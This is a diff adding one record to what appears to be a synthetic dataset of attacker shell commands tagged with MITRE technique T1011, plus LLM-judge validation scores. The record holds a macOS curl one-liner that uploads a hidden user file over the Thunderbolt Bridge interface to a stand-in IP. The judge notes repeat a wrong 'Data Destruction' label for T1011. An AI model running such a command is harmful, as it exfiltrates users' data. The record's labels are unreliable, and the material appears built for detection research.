@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
+  "explanation": "Uses the Thunderbolt Bridge interface for HTTP POST exfiltration by explicitly binding curl to that alternate medium (T1011).",
+  "rationale_steps": [
+    "Fetch Thunderbolt Bridge IP with networksetup",
+    "Bind curl to the Thunderbolt interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f3051136",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid curl flags, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically functional for data exfiltration (T1011), it does not align with the described T1011 technique of Data Destruction, as it's performing exfiltration rather than destroying data.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:02:59.632111Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitution, and proper piping.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration, which is distinct from the claimed T1011 Data Destruction technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:03:10.139979Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quotes, valid curl flags, and a correct command substitution pipeline.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates data over HTTP using a bound interface/IP and does not destroy data as described by the provided Data Destruction technique (and T1011 is not data destruction).",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:03:48.187088Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
